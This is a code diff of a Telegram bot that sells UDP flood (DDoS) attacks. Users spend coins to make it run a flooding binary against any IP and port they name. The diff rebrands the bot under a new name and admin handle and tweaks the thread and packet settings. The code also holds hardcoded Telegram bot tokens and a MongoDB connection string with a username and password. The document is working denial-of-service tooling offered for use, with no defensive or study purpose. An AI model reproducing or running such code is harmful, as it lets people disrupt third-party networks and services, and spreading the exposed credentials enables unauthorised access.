@@ -10,8 +10,8 @@ attack_in_progress = False
 current_attack = None  # Store details of the current attack
 attack_history = []  # Store attack logs
 
-TELEGRAM_BOT_TOKEN = '7282125398:AAFswQVLA09eS_uqSHmuyOPN-W8O5FrjkgI'
-ADMIN_USER_ID = 1291795330
+TELEGRAM_BOT_TOKEN = '7847084261:AAG3ibYHX7iNcH2oCpTFLSBYCYtWFliu8aU'
+ADMIN_USER_ID = 7657709742
 MONGO_URI = "mongodb+srv://rishi:ipxkingyt@rishiv.ncljp.mongodb.net/?retryWrites=true&w=majority&appName=rishiv"
 DB_NAME = "known"
 COLLECTION_NAME = "users"
@@ -21,8 +21,8 @@ COINS_REQUIRED_PER_ATTACK = 5  # Coins required for an attack
 ATTACK_COOLDOWN = 240  # Cooldown period in seconds (5 minutes)
 
 
-threads = 1000
-packet_size = 16
+threads = 750
+packet_size = 0
 
 # Global variables for managing cooldowns
 last_attack_time = defaultdict(lambda: datetime.min)
@@ -50,7 +50,7 @@ async def update_user(user_id, coins):
 async def start(update: Update, context: CallbackContext):
     chat_id = update.effective_chat.id
     message = (
-        "*🎉 Welcome to the SAM Ultimate UDP Flooder! 🎉*\n\n"
+        "*🎉 Welcome to the SAIYAM Ultimate UDP Flooder! 🎉*\n\n"
         "*🔥 Experience the pinnacle of hacking with our advanced features! 🔥*\n\n"
         "*✨ Key Features: ✨*\n"
         "🚀 *Initiate attacks on your opponents using /attack*\n"
@@ -59,7 +59,7 @@ async def start(update: Update, context: CallbackContext):
         "*⚠️ How to Use: ⚠️*\n"
         "*Utilize the commands and type /help for a complete list of commands.*\n\n"
         "*💬 Queries or Issues? 💬*\n"
-        "*Contact Admin: @Baap_hu_ter4*"
+        "*Contact Admin: @tg_maggi*"
     )
     await context.bot.send_message(chat_id=chat_id, text=message, parse_mode='Markdown')
 
@@ -196,7 +196,7 @@ async def run_attack(chat_id, ip, port, duration, context):
     attack_in_progress = True
 
     try:
-        command = f"./bgmi {ip} {port} {duration} {packet_size} {threads}"
+        command = f"./bgmi {ip} {port} {duration} {threads}"
         process = await asyncio.create_subprocess_shell(
             command,
             stdout=asyncio.subprocess.PIPE,
@@ -254,7 +254,7 @@ async def myinfo(update: Update, context: CallbackContext):
 async def help(update: Update, context: CallbackContext):
     chat_id = update.effective_chat.id
     message = (
-        "*🛠️ SAM VIP DDOS Bot Help Menu 🛠️*\n\n"
+        "*🛠️ SAIYAM VIP DDOS Bot Help Menu 🛠️*\n\n"
         "🌟 *Find everything you need here!* 🌟\n\n"
         "📜 *Available Commands:* 📜\n\n"
         "1️⃣ *🔥 /attack <ip> <port> <duration>*\n"
@@ -270,7 +270,7 @@ async def help(update: Update, context: CallbackContext):
         "   - *You're already using this command! It explains all the bot's features.*\n\n"
         "🚨 *Important Tips:* 🚨\n"
         "- *If the bot doesn't reply, it means another user is attacking. Please wait.*\n"
-        "- *If you encounter any issues, contact the admin: @Baap_hu_ter4*\n\n"
+        "- *If you encounter any issues, contact the admin: @tg_maggi"
         "💥 *Now go and start your hacking adventures!* 💥"
     )
     await context.bot.send_message(chat_id=chat_id, text=message, parse_mode='Markdown')
